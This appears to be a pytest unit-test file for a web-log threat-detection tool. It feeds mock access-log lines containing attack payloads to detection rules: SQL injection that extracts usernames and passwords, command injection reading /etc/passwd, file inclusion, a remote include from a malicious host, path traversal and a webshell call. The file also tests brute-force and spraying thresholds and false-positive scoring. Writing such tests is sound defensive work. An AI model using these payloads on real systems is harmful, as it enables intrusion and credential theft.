"""
ForensicLogX — Unit Tests for Advanced Threat Detections
Run: python -m pytest tests/test_detections.py -v
"""

import pytest
import os
import sys
import pandas as pd
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from backend.threat_engine import (
    run_all_detections,
    detect_brute_force,
    detect_credential_stuffing,
    detect_password_spraying,
    detect_ddos_indicators
)
from backend.fp_handler import FalsePositiveHandler
from backend.detection_rules import DETECTION_RULES

# Setup a clean mock dataframe maker
def make_mock_log(ip="192.168.1.100", method="GET", url="/", status=200, user_agent="Mozilla/5.0", raw=None):
    ts = datetime.utcnow()
    raw_line = raw or f'{ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{method} {url} HTTP/1.1" {status} 1024 "-" "{user_agent}"'
    return {
        "timestamp": ts,
        "ip": ip,
        "user": "admin" if "login" in url else "-",
        "method": method,
        "url": url,
        "protocol": "HTTP/1.1",
        "status": int(status),
        "bytes": 1024,
        "referer": "-",
        "user_agent": user_agent,
        "raw": raw_line
    }

class TestAdvancedThreatDetections:
    
    def test_sql_injection_detection(self):
        logs = [
            make_mock_log(url="/index.php?id=1%27+UNION+SELECT+null%2Cusername%2Cpassword+FROM+users--+-")
        ]
        df = pd.DataFrame(logs)
        threats = run_all_detections(df)
        
        sqli = [t for t in threats if t["rule_id"] == "FLX-004"]
        assert len(sqli) > 0
        assert sqli[0]["category"] == "Injection"
        assert sqli[0]["severity"] == "critical"

    def test_blind_sql_injection_detection(self):
        logs = [
            make_mock_log(url="/index.php?id=1%27+AND+SLEEP%285%29--")
        ]
        df = pd.DataFrame(logs)
        threats = run_all_detections(df)
        
        bsqli = [t for t in threats if t["rule_id"] == "FLX-005"]
        assert len(bsqli) > 0
        assert bsqli[0]["severity"] == "critical"

    def test_command_injection_detection(self):
        logs = [
            make_mock_log(url="/shell.php?cmd=cat+/etc/passwd%3Bwhoami")
        ]
        df = pd.DataFrame(logs)
        threats = run_all_detections(df)
        
        cmdi = [t for t in threats if t["rule_id"] == "FLX-006"]
        assert len(cmdi) > 0
        assert cmdi[0]["severity"] == "critical"

    def test_lfi_detection(self):
        logs = [
            make_mock_log(url="/page.php?file=../../../../etc/passwd")
        ]
        df = pd.DataFrame(logs)
        threats = run_all_detections(df)
        
        lfi = [t for t in threats if t["rule_id"] == "FLX-010"]
        assert len(lfi) > 0
        assert lfi[0]["category"] == "File-Based"

    def test_rfi_detection(self):
        logs = [
            make_mock_log(url="/page.php?file=http://malicious-site.com/exploit.php")
        ]
        df = pd.DataFrame(logs)
        threats = run_all_detections(df)
        
        rfi = [t for t in threats if t["rule_id"] == "FLX-011"]
        assert len(rfi) > 0

    def test_directory_traversal_detection(self):
        logs = [
            make_mock_log(url="/download.php?path=..%2F..%2F..%2Fsys.ini")
        ]
        df = pd.DataFrame(logs)
        threats = run_all_detections(df)
        
        trav = [t for t in threats if t["rule_id"] == "FLX-012"]
        assert len(trav) > 0

    def test_webshell_execution_detection(self):
        logs = [
            make_mock_log(url="/uploads/c99.php?cmd=whoami")
        ]
        df = pd.DataFrame(logs)
        threats = run_all_detections(df)
        
        shell = [t for t in threats if t["rule_id"] == "FLX-014"]
        assert len(shell) > 0

    def test_brute_force_detections_threshold(self):
        # Generate 9 failures (below threshold of 10)
        logs_below = [make_mock_log(ip="10.0.0.99", status=401) for _ in range(9)]
        df_below = pd.DataFrame(logs_below)
        assert len(detect_brute_force(df_below)) == 0
        
        # Generate 10 failures
        logs_above = [make_mock_log(ip="10.0.0.99", status=401) for _ in range(10)]
        df_above = pd.DataFrame(logs_above)
        assert len(detect_brute_force(df_above)) == 1

    def test_credential_stuffing_detection(self):
        # 1 IP targeting 5 unique users with 401s
        logs = []
        for i in range(5):
            log = make_mock_log(ip="192.168.2.10", url="/login", status=401)
            log["user"] = f"user{i}"
            logs.append(log)
        df = pd.DataFrame(logs)
        threats = detect_credential_stuffing(df)
        assert len(threats) == 1
        assert threats[0]["rule_id"] == "FLX-002"

    def test_password_spraying_detection(self):
        # 10 unique IPs targeting single username 'admin' with 401s
        logs = [
            make_mock_log(ip=f"192.168.3.{i}", url="/login?user=admin", status=401)
            for i in range(10)
        ]
        df = pd.DataFrame(logs)
        # Setup username parsed value for the dataframe
        df["user"] = "admin"
        threats = detect_password_spraying(df)
        assert len(threats) == 1
        assert threats[0]["rule_id"] == "FLX-003"


class TestFalsePositiveHandler:
    
    def test_rfc1918_ip_classification(self):
        handler = FalsePositiveHandler()
        assert handler.is_rfc1918_ip("192.168.1.100") == True
        assert handler.is_rfc1918_ip("10.0.0.5") == True
        assert handler.is_rfc1918_ip("127.0.0.1") == True
        assert handler.is_rfc1918_ip("8.8.8.8") == False

    def test_legitimate_bot_user_agent(self):
        handler = FalsePositiveHandler()
        assert handler.is_legitimate_bot("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)") == True
        assert handler.is_legitimate_bot("Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)") == True
        assert handler.is_legitimate_bot("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/100.0.0.0") == False

    def test_static_or_health_path(self):
        handler = FalsePositiveHandler()
        assert handler.is_static_or_health_path("/static/css/style.css") == True
        assert handler.is_static_or_health_path("/health") == True
        assert handler.is_static_or_health_path("/dvwa/vulnerabilities/sqli/") == False

    def test_confidence_score_reduction_for_fps(self):
        handler = FalsePositiveHandler()
        # Normal scan: base confidence remains
        score_normal = handler.adjust_confidence(
            base_confidence=80,
            ip="8.8.8.8",
            user_agent="Mozilla/5.0",
            url="/admin"
        )
        assert score_normal == 80
        
        # Internal IP + Search Bot + Static Asset
        score_fp = handler.adjust_confidence(
            base_confidence=80,
            ip="192.168.1.5",
            user_agent="Googlebot/2.1",
            url="/assets/logo.png"
        )
        # Reduction: 80 - 20 (IP) - 30 (Bot) - 25 (Static) = 5
        assert score_fp == 5
